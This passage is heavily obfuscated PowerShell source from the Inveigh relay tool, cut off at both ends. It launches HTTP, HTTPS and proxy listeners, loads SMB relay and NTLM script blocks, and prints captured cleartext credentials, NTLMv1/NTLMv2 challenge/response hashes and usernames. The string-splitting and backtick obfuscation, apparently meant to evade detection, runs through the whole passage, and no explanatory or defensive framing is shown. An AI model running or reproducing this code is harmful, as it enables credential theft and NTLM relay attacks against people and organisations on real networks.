            ${Inv`EI`Gh}."con`SoL`e_queUe".("{0}{1}" -f 'Ad','d').Invoke(("Inveigh exited at $(Get-Date -format 's') "))

            if(${invei`gh}."fI`LE`_OU`Tput")
            {
                ${In`VE`IgH}."l`og_FILE_`q`UEUe".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Inveigh exited due to $exit_message "))
            }

            if(${inVE`i`GH}."l`Og_Ou`TPUt")
            {
                ${INv`eIGh}."l`OG".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh exited due to $exit_message "))
            }

            &("{0}{1}{2}"-f 'Star','t','-Sleep') -S 1
            ${in`V`eIGH}."r`UNNiNG" = ${fa`lse}
        }

        if(${Inv`E`igH}."Re`LaY`_`RuNninG")
        {
            &("{1}{2}{0}"-f't-Sleep','St','ar') -S 1
            ${i`NVEI`Gh}."CoNso`Le_quE`UE".("{1}{0}"-f'dd','A').Invoke(("Inveigh Relay exited due to $exit_message at $(Get-Date -format 's') "))

            if(${i`NVE`igh}."fiL`e_OuT`P`UT")
            {
                ${INvEI`gh}."L`og_Fi`Le_Qu`e`Ue".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message "))
            }

            if(${InV`EI`gH}."loG_ouT`p`Ut")
            {
                ${iNVEI`GH}."l`OG".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message "))
            }

            &("{1}{2}{0}" -f'p','Star','t-Slee') -S 1
            ${Inv`EI`gh}."REL`AY_R`U`Nn`INg" = ${F`ALsE}

        } 

        ${I`NVEIgH}."Ht`TPs" = ${FA`L`sE}
    }

    if(${runtI`Me})
    {    
        ${CO`Nt`ROL_ti`MEoUt} = &("{0}{2}{1}"-f 'New-Time','n','Spa') -Minutes ${ruN`T`Ime}
        ${CONTrOL`_sTO`pw`AtCh} =  ${YU`B6}::("{0}{1}{2}" -f'Star','t','New').Invoke()
    }
       
    while(${in`V`Eigh}."rEla`Y_`R`UnnInG")
    {
        
        if(${R`E`LayAuTOe`X`iT} -eq 'Y' -and !${i`NV`eIgH}."SM`B_reLAY")
        {
            &("{3}{1}{2}{0}" -f'eep','t-','Sl','Star') -S 5
            &("{0}{2}{1}" -f 'St','pInveigh','o') ("{0}{4}{2}{1}{3}"-f 'd','bled','a',' relay','is')
        }

        if(${Run`Ti`me})
        {

            if(${cOn`TrO`l_sT`O`PwA`Tch}."eLa`pS`ED" -ge ${cONtR`o`l`_`TiMEOuT})
            {
                &("{2}{1}{0}{3}"-f 'ei','Inv','Stop','gh') ("{0}{2}{1}" -f'r','e','un tim')
            }

        }

        if(${InveI`gH}."FILe_OU`T`p`Ut" -and -not ${in`VeiGh}."CONT`RoL")
        {

            while(${INv`Ei`Gh}."LoG_fi`l`e_QUe`UE"."co`Unt" -gt 0)
            {
                ${Inv`E`IGh}."Log_`Fi`LE_`Q`UEuE"[0]|&("{1}{2}{0}" -f'e','Out','-Fil') ${IN`VEI`gH}."Lo`g_oUT`_F`IlE" -Append
                ${i`NV`eIgH}."Lo`G_fIL`e_`QUeUE".("{1}{0}" -f 'veAt','Remo').Invoke(0)
            }

            while(${iNV`ei`GH}."ntL`mv1`_`F`ilE_Que`UE"."cO`UNt" -gt 0)
            {
                ${inV`Ei`GH}."ntLmv1_`FI`l`E_QuE`UE"[0]|&("{0}{1}{2}"-f 'O','ut','-File') ${I`Nve`igH}."nT`L`Mv1_OU`T`_fILE" -Append
                ${Inv`eIGh}."NtlmV`1`_Fil`E_q`Ueue".("{1}{2}{0}"-f't','Remo','veA').Invoke(0)
            }

            while(${I`NvEi`gh}."nt`Lm`V2_FILE_Q`UE`UE"."Co`Unt" -gt 0)
            {
                ${in`VEIgH}."ntLM`V2`_FI`L`E_qu`EuE"[0]|&("{0}{1}" -f 'Out','-File') ${INvE`I`Gh}."NTL`m`V`2`_ouT_File" -Append
                ${inv`EI`Gh}."nT`l`mV2_fi`Le_`qU`Eue".("{1}{0}{2}"-f'v','Remo','eAt').Invoke(0)
            }

            while(${in`Ve`igH}."ClEaR`TeXt_`FIlE`_`Q`UEUE"."co`UNT" -gt 0)
            {
                ${I`NvEi`gH}."C`learTEX`T_`FiLe_QUEue"[0]|&("{1}{0}"-f'-File','Out') ${I`Nv`EIgH}."CL`E`AR`TeXt_`oUt_f`iLe" -Append
                ${i`N`VEigh}."CLeaRT`EX`T`_`F`ilE_quEuE".("{2}{0}{1}" -f 'v','eAt','Remo').Invoke(0)
            }

            while(${iNV`e`IGH}."F`Orm_`I`Nput_FiL`e_q`UeuE"."CO`Unt" -gt 0)
            {
                ${iNv`eIGh}."F`O`RM_In`Put_fIlE_`QUeuE"[0]|&("{2}{0}{1}" -f'ut-F','ile','O') ${INv`Ei`GH}."f`ORm_iNp`U`T_Out_filE" -Append
                ${I`NV`EiGh}."For`M`_i`NPut_`FILE_QUeuE".("{1}{2}{0}"-f'oveAt','Re','m').Invoke(0)
            }
        
        }

        if(!${I`Nve`igh}."c`O`NSOle`_`oUTPuT" -and ${con`SOL`eQu`E`UeLImIT} -ge 0)
        {

            while(${iNVe`I`gh}."Co`NSole_q`U`Eue"."COu`NT" -gt ${coNso`lequ`EUeLi`mIT} -and !${I`NveI`gH}."ConSoL`e_`OuT`put")
            {
                ${INV`eIgH}."C`O`NSOLe_`qUeUE".("{0}{2}{1}" -f'R','moveAt','e').Invoke(0)
            }

        }

        &("{2}{0}{1}" -f'ar','t-Sleep','St') -m 5
    }

 }


function h`TtpLIStEn`ER()
{
    ${hT`TPS_LiS`TE`N`ER} = ${fA`L`Se}
    ${PROx`y`_LisTe`NER} = ${fA`lSe}
    ${ht`TP_R`UNsP`AcE} =  (&("{1}{0}"-f'm','ite')  ('variabLE:'+'5'+'7x'+'Tn6'))."va`Lue"::("{0}{2}{3}{1}"-f'Create','e','Runsp','ac').Invoke()
    ${H`Ttp_`Ru`N`spACe}.("{1}{0}" -f'pen','O').Invoke()
    ${Htt`p_R`UNSPA`Ce}."SEsSIO`N`s`TateP`RoXY".("{0}{1}{2}"-f'S','e','tVariable').Invoke(("{2}{1}{0}"-f 'gh','ei','inv'),${iNVE`iGH})
    ${hTTp_`PowE`RSh`eLl} =  (  &("{2}{1}{0}{3}" -f 'v','eT-','G','ARiaBlE')  ("4Ojw"+"P") -VaLUEOnLY )::("{1}{0}"-f 'te','Crea').Invoke()
    ${hTtP_po`we`RshE`Ll}."Ru`Ns`PaCe" = ${HT`T`p_runs`Pa`CE}
    ${H`TTp_pOW`ERS`H`eLl}.("{2}{0}{1}" -f 'S','cript','Add').Invoke(${sHa`RED_`Ba`SI`C_fU`NCTioN`S`_scrip`TB`Lo`Ck}) > ${nu`ll}
    ${hT`TP_pO`wERSHE`Ll}.("{1}{2}{0}" -f 'cript','Add','S').Invoke(${IRki`N_F`U`NCtioN`S_`sCRIpTbLo`ck}) > ${nU`lL}
    ${HT`T`P_P`OweRs`heLL}.("{0}{2}{1}" -f'A','dScript','d').Invoke(${S`mB_RElay_chAl`LEn`Ge_s`crIpt`Bl`OcK}) > ${NU`LL}
    ${h`T`TP_p`O`WERshEll}.("{0}{2}{1}"-f'AddScri','t','p').Invoke(${sM`B_`RelAY`_Re`SP`oNs`e`_sCRIPtBloCk}) > ${NU`lL}
    ${hTTP_p`Ow`ERs`hell}.("{2}{0}{1}"-f 'Sc','ript','Add').Invoke(${S`m`B_RelAy_EX`E`c`Ut`E_S`cr`IpTBlock}) > ${n`Ull}
    ${HttP`_P`OWE`RSHeLl}.("{0}{1}{2}"-f 'Ad','dS','cript').Invoke(${sm`B_nt`l`M_`Func`T`Io`Ns_sCrip`TBlock}) > ${n`ULl}
    ${htT`p`_po`wERSHE`lL}.("{1}{0}" -f'Script','Add').Invoke(${Htt`p_s`Crip`TbLOcK}).("{1}{0}{2}" -f 'ddAr','A','gument').Invoke(${C`hal`lEngE}).("{0}{2}{1}"-f'AddArgum','t','en').Invoke(${CO`mm`ANd}).("{2}{0}{1}" -f'e','nt','AddArgum').Invoke(
        ${ht`T`pIp}).("{0}{3}{2}{1}"-f 'AddAr','ment','u','g').Invoke(${h`TtPPoRt}).("{2}{3}{0}{1}"-f'A','rgument','A','dd').Invoke(${Ht`TpresET`D`el`Ay}).("{1}{0}{2}" -f 'gumen','AddAr','t').Invoke(
        ${httpr`eSe`TD`EL`AytiMeouT}).("{2}{1}{0}"-f 't','dArgumen','Ad').Invoke(${H`Ttps_`lIstE`N`Er}).("{2}{0}{3}{1}"-f 'gume','t','AddAr','n').Invoke(${Pro`Xy}).("{2}{1}{0}{3}"-f'r','ddA','A','gument').Invoke(
        ${pR`OXYIG`N`Ore}).("{1}{2}{0}" -f 'ument','Add','Arg').Invoke(${Pro`X`y_`lIs`TENEr}).("{1}{0}{2}"-f 'ddArgume','A','nt').Invoke(${reLa`yAU`T`odiSablE}).("{1}{0}{2}"-f 'gume','AddAr','nt').Invoke(
        ${seR`V`ICE}).("{2}{0}{1}" -f 'Arg','ument','Add').Invoke(${s`mB_versI`ON}).("{1}{2}{3}{0}" -f'nt','AddA','r','gume').Invoke(${tarG`et}).("{0}{1}{2}" -f 'Ad','dAr','gument').Invoke(${U`SE`RnaMeS}).("{1}{2}{3}{0}" -f 'nt','Add','Arg','ume').Invoke(
        ${w`P`ADa`UtH}).("{0}{2}{1}{3}" -f 'A','gum','ddAr','ent').Invoke(${WPa`dA`UThIGN`OrE}).("{2}{1}{0}"-f 'ment','ddArgu','A').Invoke(${Wp`ADreS`poNSE}) > ${n`UlL}
    ${h`TTP_`po`wErsh`ell}.("{0}{1}{2}" -f 'B','eg','inInvoke').Invoke() > ${N`ULL}
}

&("{0}{1}{2}{3}" -f 'Start','-','Sl','eep') -m 50


function httP`Sl`I`stEnEr()
{
    ${hT`TPs_l`i`sTener} = ${T`Rue}
    ${Pr`o`Xy_LI`sTe`NEr} = ${F`AlSe}
    ${Http`S_rU`NspA`ce} =  ( &("{2}{1}{0}"-f'ArIaBLE','V','GEt-') 57xtN6 )."va`LuE"::("{2}{0}{3}{1}"-f'R','pace','Create','uns').Invoke()
    ${Ht`TPs_R`UNsPAcE}.("{1}{0}" -f 'en','Op').Invoke()
    ${H`TT`ps_rUNS`P`ACe}."S`eSsi`OnSTa`TEprO`xY".("{1}{2}{0}"-f'iable','SetVa','r').Invoke(("{2}{0}{1}"-f 'ig','h','inve'),${iNV`e`IgH})
    ${h`TTps_`pOweR`sHell} =   ${4oJ`Wp}::("{0}{1}"-f 'Crea','te').Invoke()
    ${hTTpS_P`OwEr`shE`LL}."RunSP`A`ce" = ${HT`TP`s_Run`S`PACE}
    ${htTPS_`po`WersH`Ell}.("{3}{2}{0}{1}"-f'rip','t','c','AddS').Invoke(${ShARed_BaSI`c`_FuNCTiONs`_S`cRip`T`BLo`cK}) > ${NU`ll}
    ${HttP`s`_`Pow`ERsHE`lL}.("{3}{2}{0}{1}"-f'ip','t','r','AddSc').Invoke(${IRK`IN_fuNcT`i`O`NS_sc`RIpTbl`OCk}) > ${NU`ll}
    ${httP`s_pOWEr`sH`e`ll}.("{2}{0}{1}"-f 'S','cript','Add').Invoke(${sMb_rELay_C`HalLenGE`_`ScRIpt`B`Lock}) > ${N`ULL}
    ${HttPs_P`o`WeRS`HELl}.("{0}{1}{2}" -f 'A','ddScr','ipt').Invoke(${SMB_r`Elay`_rEspo`N`SE`_s`criPtb`l`OCK}) > ${N`UlL}
    ${h`Ttp`s`_PoWerS`HELl}.("{0}{2}{1}"-f 'AddScri','t','p').Invoke(${SMb_`REl`A`Y_EXE`c`Ute_ScripTBLoCk}) > ${Nu`LL}
    ${H`TTPS_poWer`sHe`lL}.("{0}{2}{1}"-f'Ad','Script','d').Invoke(${smB_NT`Lm_`FuNCt`IoN`s_SCRiptbl`O`Ck}) > ${nu`Ll}
    ${HTtPs_pO`WE`R`SH`ELL}.("{0}{1}{2}" -f 'Ad','dSc','ript').Invoke(${hT`T`p`_s`criPTblOcK}).("{2}{1}{0}" -f 'dArgument','d','A').Invoke(${c`haL`LE`NgE}).("{0}{2}{1}" -f'Add','t','Argumen').Invoke(${Co`mMa`ND}).("{0}{1}{2}" -f 'AddArgu','men','t').Invoke(
        ${hT`TP`ip}).("{3}{0}{2}{1}"-f 'ddArg','ent','um','A').Invoke(${hTtp`s`PoRT}).("{2}{1}{0}" -f 'nt','gume','AddAr').Invoke(${h`TTPRES`etd`elAy}).("{0}{1}{2}{3}" -f 'A','d','dAr','gument').Invoke(
        ${H`T`Tpre`sETdeLAy`TiMEoUt}).("{2}{1}{0}" -f 'ment','ddArgu','A').Invoke(${Ht`T`ps_lI`STENer}).("{0}{1}{2}" -f'Ad','dArg','ument').Invoke(${pr`oxy}).("{1}{0}{2}" -f 'ddArgumen','A','t').Invoke(
        ${PrOXYi`g`NORe}).("{0}{1}{2}"-f 'Add','Argume','nt').Invoke(${ProX`y`_`LisTeNeR}).("{3}{1}{0}{2}" -f 'gumen','r','t','AddA').Invoke(${r`El`AY`AuTodiSaBLe}).("{1}{0}{2}" -f 'ddArgum','A','ent').Invoke(
        ${sEr`V`ICE}).("{0}{2}{3}{1}" -f'AddA','ent','r','gum').Invoke(${SmB_`Ve`Rs`ioN}).("{2}{0}{1}"-f 'Argume','nt','Add').Invoke(${t`ARG`et}).("{1}{3}{2}{0}" -f't','A','Argumen','dd').Invoke(${usE`R`Na`MeS}).("{2}{3}{0}{1}" -f 'men','t','A','ddArgu').Invoke(
        ${W`pa`Da`Uth}).("{1}{0}{2}" -f 'A','Add','rgument').Invoke(${wPaD`AUTH`iGn`orE}).("{2}{3}{1}{0}" -f'gument','r','Add','A').Invoke(${WPADR`E`s`poNse}) > ${nu`lL}
    ${HtTps_`poW`E`Rs`H`ElL}.("{1}{2}{0}" -f'ke','B','eginInvo').Invoke() > ${N`UlL}
}

&("{3}{1}{0}{2}" -f 'Slee','rt-','p','Sta') -m 50


function PR`oxy`li`ST`eNEr()
{
    ${Ht`TPS_`li`sTENEr} = ${fA`lSe}
    ${PR`o`Xy`_lISTEN`er} = ${T`RUe}
    ${P`R`oXy_r`UNSpacE} =   (  &("{1}{2}{0}"-f'lE','gET-VARi','AB') 57XtN6  )."V`ALue"::("{2}{0}{3}{1}"-f 'ea','Runspace','Cr','te').Invoke()
    ${P`R`OxY_`RUNSp`Ace}.("{1}{0}"-f'pen','O').Invoke()
    ${pr`O`Xy_rU`NSPacE}."S`E`SsIOns`Ta`TEPrO`XY".("{2}{0}{1}"-f'ia','ble','SetVar').Invoke(("{1}{2}{0}"-f'h','i','nveig'),${In`V`eIgH})
    ${pr`o`XY`_PO`WershE`ll} =   (&("{0}{1}{2}" -f 'VArI','A','blE') ('4oJ'+'wp')  )."V`ALUE"::("{2}{1}{0}" -f'te','a','Cre').Invoke()
    ${P`RoX`Y_pOwERs`H`eLl}."run`spa`Ce" = ${pR`oXY_ru`Nspace}
    ${prox`y_powe`RshE`ll}.("{2}{1}{0}"-f 'ript','Sc','Add').Invoke(${s`HaRED`_`BaSic_f`UNC`Ti`o`N`S`_sCRIPTBLock}) > ${n`UlL}
    ${p`ROXy_Pow`e`RShe`Ll}.("{0}{1}"-f'AddSc','ript').Invoke(${I`RKin_`FUNC`TionS`_`SC`RipTBLo`ck}) > ${n`ULL}
    ${P`Rox`y_`powERsHELl}.("{0}{1}{2}" -f'AddScr','ip','t').Invoke(${sMb_r`Ela`y_C`h`A`llenGE_scr`i`ptbloCK}) > ${NU`LL}
    ${PrO`x`y_`poWe`RsH`eLl}.("{1}{2}{0}"-f'pt','Ad','dScri').Invoke(${SMb_ReLAY`_RE`spoNs`E_`scR`iPt`BLock}) > ${Nu`ll}
    ${proX`y`_PowE`RShE`Ll}.("{1}{0}" -f 'cript','AddS').Invoke(${sM`B_`ReL`AY_exe`CU`T`E_`S`Cr`IptbLOck}) > ${N`Ull}
    ${pr`OxY_p`owErS`he`LL}.("{1}{2}{0}"-f'pt','AddS','cri').Invoke(${smB_n`Tl`m_fUNCtI`ON`s`_ScRI`P`TBL`oCK}) > ${n`ULl}
    ${p`RoXY_Pow`e`Rs`H`ELL}.("{1}{2}{3}{0}"-f 't','A','dd','Scrip').Invoke(${httP_`S`CRi`p`T`BLoCk}).("{2}{1}{0}{3}"-f 'gume','ddAr','A','nt').Invoke(${CHa`L`LENgE}).("{1}{3}{2}{0}"-f 't','AddA','umen','rg').Invoke(${comm`A`Nd}).("{1}{2}{0}" -f'ment','Ad','dArgu').Invoke(
        ${pR`O`XyiP}).("{1}{0}{2}{3}"-f 'dd','A','Argumen','t').Invoke(${p`ROXYpo`Rt}).("{0}{2}{1}" -f'AddAr','ument','g').Invoke(${HT`T`PrEseT`De`LaY}).("{1}{2}{0}{3}" -f 'Ar','Ad','d','gument').Invoke(
        ${HTt`P`RES`etdElA`Y`TiMeout}).("{2}{0}{1}"-f 'r','gument','AddA').Invoke(${hTtp`s_`LiS`TEnEr}).("{2}{0}{1}"-f 'ddArgumen','t','A').Invoke(${pr`oXY}).("{2}{0}{1}" -f 'rgumen','t','AddA').Invoke(
        ${Pr`OxY`ig`NORE}).("{0}{2}{3}{1}"-f 'AddA','nt','rg','ume').Invoke(${prOXY_`LI`s`TeNER}).("{2}{1}{0}" -f 't','rgumen','AddA').Invoke(${R`ElAYautO`DIS`AB`Le}).("{3}{2}{0}{1}"-f 'gu','ment','r','AddA').Invoke(
        ${S`eRv`iCe}).("{2}{0}{1}"-f'dArgu','ment','Ad').Invoke(${sm`B_ver`s`IoN}).("{2}{0}{1}{3}" -f 'd','dArg','A','ument').Invoke(${targ`ET}).("{2}{0}{1}"-f 'ume','nt','AddArg').Invoke(${us`eRna`Mes}).("{0}{1}{3}{2}"-f'Add','Argum','t','en').Invoke(
        ${wP`ADA`Uth}).("{0}{2}{1}{3}"-f'A','dAr','d','gument').Invoke(${W`p`ADauThi`gNO`Re}).("{2}{0}{1}" -f'ddArgumen','t','A').Invoke(${wp`A`dRe`s`PonsE}) > ${nu`lL}
    ${PR`ox`y_p`ow`ersHe`LL}.("{1}{2}{0}" -f'nInvoke','Beg','i').Invoke() > ${nu`ll}
}


function co`Ntr`OLReLaYLoop()
{
    ${cO`Ntrol_rElaY`_`RuNs`pAce} =   (  &("{1}{3}{0}{2}" -f 'HiL','ge','DItEM','T-C')  VARIabLE:57XTN6 )."vA`LUE"::("{1}{3}{0}{2}"-f 'a','Cre','ce','ateRunsp').Invoke()
    ${ControL`_`RElay_R`U`NsPAcE}.("{0}{1}"-f 'O','pen').Invoke()
    ${con`Trol_`R`ELay_ruN`s`pAce}."se`SSi`ONSt`A`TePR`oXY".("{1}{0}{2}"-f 'ab','SetVari','le').Invoke(("{0}{1}{2}"-f 'i','nvei','gh'),${InVe`igh})
    ${Co`NtRol_`RELA`y_`pOw`E`RshELl} =  ${4o`Jwp}::("{0}{1}"-f 'Crea','te').Invoke()
    ${CONTr`O`l_re`l`AY`_pOwE`RS`heLl}."RuN`s`PACe" = ${cO`NTrOl`_RELA`Y`_rUns`PAce}
    ${CO`N`T`RoL_RElAy`_pO`W`ERs`helL}.("{0}{2}{1}"-f 'A','dScript','d').Invoke(${ShaR`E`d_bA`S`IC_FU`Nc`TiO`Ns_SCRi`PT`BLOCK}) > ${N`ULl}
    ${conTRO`l_`R`ELAy_poW`ershEll}.("{2}{1}{0}" -f'Script','d','Ad').Invoke(${ConTrOL_rE`LAy_s`CRiptb`l`OCK}).("{3}{2}{0}{1}"-f 'men','t','rgu','AddA').Invoke(${CON`SO`LEQUE`U`e`limit}).("{2}{1}{0}" -f 'ment','gu','AddAr').Invoke(
        ${REl`Ayaut`oe`xiT}).("{1}{2}{3}{0}"-f 'ent','Ad','dAr','gum').Invoke(${rUn`TImE}) > ${n`ULL}
    ${C`O`NtRoL_r`elay_`POwErShE`Ll}.("{1}{0}{2}" -f 'nIn','Begi','voke').Invoke() > ${n`Ull}
}


if(${HT`TP} -eq 'Y')
{
    &("{0}{2}{1}"-f 'HTT','er','PListen')
}


if(${HtT`pS} -eq 'Y')
{
    &("{0}{2}{1}" -f'HTTPS','stener','Li')
}


if(${Pro`XY} -eq 'Y')
{
    &("{0}{1}{2}"-f'Prox','yListen','er')
}


if(${ConSO`L`EQu`E`UELIMiT} -ge 0 -or ${in`Ve`iGH}."File`_O`UtpUt" -or ${Rel`AyA`UtOEXIT} -or ${RUN`Ti`mE})
{
    &("{3}{4}{2}{0}{1}" -f'layLoo','p','e','C','ontrolR')
}


try
{

    if(${In`V`EiGH}."coN`SOLe_O`UT`Put")
    {

        if(${c`o`N`sOLe`sTaTUS})
        {    
            ${co`N`s`OlE_St`AtU`s_`TImEouT} = &("{0}{3}{1}{2}" -f 'Ne','me','Span','w-Ti') -Minutes ${conS`olESt`At`US}
            ${CON`S`Ole_S`TATuS_sto`P`WA`Tch} =   ${Y`UB6}::("{2}{0}{1}"-f'rtN','ew','Sta').Invoke()
        }

        :console_loop while(${INv`eigh}."r`eLaY`_R`UN`NiNG" -and ${I`NveI`Gh}."CoNsOl`E_`Out`pUT")
        {

            while(${i`Nv`eigh}."cO`NsOle`_quEue"."C`ouNt" -gt 0)
            {

                switch -wildcard (${inVei`gh}."Co`N`s`olE_qU`Eue"[0])
                {

                    {${_} -like ("{1}{3}{0}{2}"-f 'te','* ','n to *','writ') -or ${_} -like ("{1}{3}{2}{0}" -f 'lay *','* f','r re','o') -or ${_} -like ("{0}{1}{3}{2}" -f '*','SMB','elay *',' r') -or ${_} -like ("{3}{2}{1}{0}{4}{6}{5}{7}" -f 'a','l ',' loca','*','d','s','mini','trator *')}
                    {

                        if(${In`VEIGH}."oUtpU`T_StrEam`_o`N`Ly")
                        {
                            &("{3}{1}{2}{0}" -f 't','-Outp','u','Write')(${I`Nve`IGh}."cO`NSOlE_Q`UEUE"[0] + ${INV`E`igh}."nE`w`lINE")
                        }
                        else
                        {
                            &("{2}{3}{1}{0}{4}" -f'War','te-','W','ri','ning')(${In`VE`Igh}."cOn`SOLE_`q`U`EUE"[0])
                        }

                        ${iNVeI`GH}."Con`s`Ole_QUe`Ue".("{0}{1}{2}" -f 'R','emove','At').Invoke(0)
                    }

                    {${_} -like ("{4}{1}{2}{3}{0}{5}"-f 's di','o','of','er i','* sp','sabled') -or ${_} -like ("{3}{1}{0}{2}"-f' re','l','quest','* loca') -or ${_} -like ("{0}{1}{2}"-f'* ho','s','t header *') -or ${_} -like ("{1}{2}{5}{0}{4}{3}"-f'e','* user a','gent','eived *','c',' r')}
                    {

                        if(${C`oNs`ole`o`UTpuT} -eq 'Y')
                        {

                            if(${inv`EIgh}."O`UTPuT_STream`_`o`Nly")
                            {
                                &("{0}{1}{2}" -f'Write-O','utp','ut')(${i`NvE`Igh}."Co`NS`oLE_q`U`eUe"[0] + ${inV`E`iGH}."NEwl`INE")
                            }
                            else
                            {
                                &("{0}{2}{1}{3}" -f 'Write','u','-Outp','t')(${I`NVeI`gH}."c`ONSoLE_q`Ueue"[0])
                            }

                        }

                        ${In`VE`IgH}."Co`NSOLE_Q`UE`Ue".("{1}{0}" -f 'emoveAt','R').Invoke(0)

                    } 

                    {${_} -like ("{0}{2}{1}"-f '* re','sent','sponse ') -or ${_} -like ("{2}{1}{3}{0}"-f ' *','gnori','* i','ng') -or ${_} -like ("{1}{0}{4}{2}{3}"-f'HTTP','* ','or',' *','*request f') -or ${_} -like ("{1}{3}{4}{0}{2}"-f 'quest ','*','for *',' ','Proxy re')}
                    {
                    
                        if(${cONSo`l`EOU`TP`UT} -ne "Low")
                        {

                            if(${i`N`VeIGh}."OuT`PUT`_sTr`EaM_o`N`lY")
                            {
                                &("{1}{3}{0}{2}"-f'tp','Write-O','ut','u')(${iNVe`Igh}."C`ONSOL`E_`que`Ue"[0] + ${i`NvEI`gH}."n`Ew`lIne")
                            }
                            else
                            {
                                &("{0}{2}{1}"-f'Wr','tput','ite-Ou')(${I`NVE`igH}."C`oNsole_`q`Ue`UE"[0])
                            }

                        }

                        ${i`NVEIGH}."Co`Ns`O`lE_Q`UEuE".("{2}{1}{0}"-f'At','ve','Remo').Invoke(0)

                    } 

                    ("{2}{0}{1}"-f 'u','lt','defa')
                    {

                        if(${I`Nve`IGH}."oUTPut_stRE`A`m`_`ON`LY")
                        {
                            &("{3}{0}{1}{2}" -f '-O','u','tput','Write')(${Inv`ei`GH}."coN`S`OlE_qUeuE"[0] + ${iN`V`Eigh}."NeWL`INE")
                        }
                        else
                        {
                            &("{3}{0}{1}{2}"-f 'te-','O','utput','Wri')(${I`NV`eIGh}."ConsOlE`_que`UE"[0])
                        }

                        ${inV`EI`gH}."cO`NsoL`E_QUeuE".("{0}{2}{1}"-f 'Re','At','move').Invoke(0)
                    }

                }

            }

            if(${COn`s`OLES`Tatus} -and ${Cons`OlE`_`StatuS_ST`Op`WAtCh}."E`lap`SEd" -ge ${cONSo`Le_STa`TUs_`Timeo`UT})
            {
            
                if(${I`Nv`eIGH}."clE`A`R`TEXt_`LIsT"."C`OUNt" -gt 0)
                {
                    &("{2}{1}{0}{3}"-f'utp','ite-O','Wr','ut')(("$(Get-Date -format 's') - Current unique cleartext captures: ") + ${I`NvEI`GH}."NE`Wl`inE")
                    ${inV`e`IGH}."c`LeA`R`Te`XT_LiST".("{0}{1}"-f 'So','rt').Invoke()

                    foreach(${uni`QUe_cle`Art`eXT} in ${inv`EigH}."cL`ea`R`Te`xt_LIst")
                    {
                        if(${u`NiqU`E_`cl`eArTEXT} -ne ${UNIque_CL`ea`R`TEXt_LA`st})
                        {
                            &("{3}{1}{0}{2}" -f'utp','rite-O','ut','W')(${UnI`Que`_`ClEArTeXt} + ${in`Ve`IGH}."ne`W`linE")
                        }

                        ${UnIQUe_`Cl`eAr`Text_L`Ast} = ${U`N`IQuE_cl`e`ArtExt}
                    }

                    &("{0}{3}{2}{1}" -f'Star','ep','le','t-S') -m 5
                }
                else
                {
                    &("{0}{3}{2}{1}" -f 'Wr','t','u','ite-Outp')(("$(Get-Date -format 's') - No cleartext credentials have been captured ") + ${I`NVeigh}."NE`WLIne")
                }
            
                if(${i`NveiGH}."NtlmV`1_`list"."C`OuNt" -gt 0)
                {
                    &("{1}{2}{0}"-f 'Output','Writ','e-')(("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures: ") + ${I`NVEi`Gh}."new`LiNe")
                    ${inv`e`iGH}."Ntl`mV1_L`ist".("{0}{1}"-f'S','ort').Invoke()

                    foreach(${U`Niq`UE_`NTlm`V1} in ${IN`VeI`Gh}."NTLmV1_`L`I`St")
                    {
                        ${uNI`Q`U`e_N`TlMv1`_acCOUNt} = ${U`NIQ`UE_`NTL`mV1}.("{1}{2}{0}" -f'ng','Su','bStri').Invoke(0,${U`Niqu`e_Nt`l`mV1}.("{0}{1}{2}" -f'Index','O','f').Invoke(":",(${Un`i`qUe_nT`LMv1}.("{1}{2}{0}" -f 'f','Index','O').Invoke(":") + 2)))

                        if(${uni`quE`_Ntlm`V1`_AccoUnt} -ne ${unique_nt`lmV`1_A`ccO`UnT_La`st})
                        {
                            &("{1}{0}{2}" -f '-','Write','Output')(${uN`IQu`E_`NTLm`V1} + ${I`NvE`igh}."NE`wl`Ine")
                        }

                        ${uNi`Qu`e_NTlm`V1_a`c`COUnt_lasT} = ${UnI`qUe`_`NtLMv1_A`ccOUNT}
                    }

                    ${uN`iq`UE_NT`L`MV1_aCco`Unt`_lASt} = ''
                    &("{1}{2}{3}{0}" -f 'p','St','art-Sl','ee') -m 5
                    &("{0}{2}{3}{1}"-f 'Wr','t','ite-Out','pu')(("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames: ") + ${I`NVeI`Gh}."n`EWLiNE")

                    foreach(${N`Tlmv1`_`UserN`Ame} in ${IN`VEIgH}."NtLmv1`_Use`RnaME`_lIst")
                    {
                        &("{0}{2}{1}" -f'Wri','put','te-Out')(${N`Tlmv1_`USer`NaMe} + ${IN`VeI`gh}."nE`wlI`Ne")
                    }

                    &("{1}{2}{0}{3}" -f'-S','St','art','leep') -m 5
                }
                else
                {
                    &("{1}{2}{0}"-f't','W','rite-Outpu')(("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured ") + ${INv`Ei`gh}."n`eWl`INe")
                }

                if(${INVe`I`Gh}."n`Tlm`V2_lisT"."COu`Nt" -gt 0)
                {
                    &("{1}{0}{2}"-f '-Ou','Write','tput')(("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures: ") + ${InVe`i`Gh}."NeWli`NE")
                    ${Inv`EI`GH}."NTlMv2_L`i`St".("{0}{1}"-f'S','ort').Invoke()

                    foreach(${uNiQU`E_N`Tlm`V2} in ${iNv`e`IGH}."N`T`l`Mv2_liSt")
                    {
                        ${U`NI`quE_N`Tlm`V2_`Ac`COUNt} = ${U`NI`q`Ue_nTl`MV2}.("{1}{0}{2}"-f'tri','SubS','ng').Invoke(0,${un`Iq`Ue_`N`Tlmv2}.("{0}{1}"-f'In','dexOf').Invoke(":",(${unIqUE`_`NTL`mV2}.("{1}{0}" -f'exOf','Ind').Invoke(":") + 2)))

                        if(${UN`i`qUE_NTLmv`2`_ACCo`U`Nt} -ne ${uN`iQuE_NtLMV2_`A`Cco`Un`T_l`ASt})
                        {
                            &("{0}{1}{2}"-f'Write-','Outpu','t')(${uNi`QUE`_nTLM`V2} + ${in`Vei`gH}."N`Ewli`NE")
                        }

                        ${uniQU`E`_NTl`m`V2_a`ccouN`T_`Last} = ${UNI`qUe_`Nt`lMV`2_AcC`ouNT}
                    }

                    ${UNiqU`E_`Nt`lMv`2_a`cCOU`NT_lASt} = ''
                    &("{2}{0}{1}"-f'ee','p','Start-Sl') -m 5
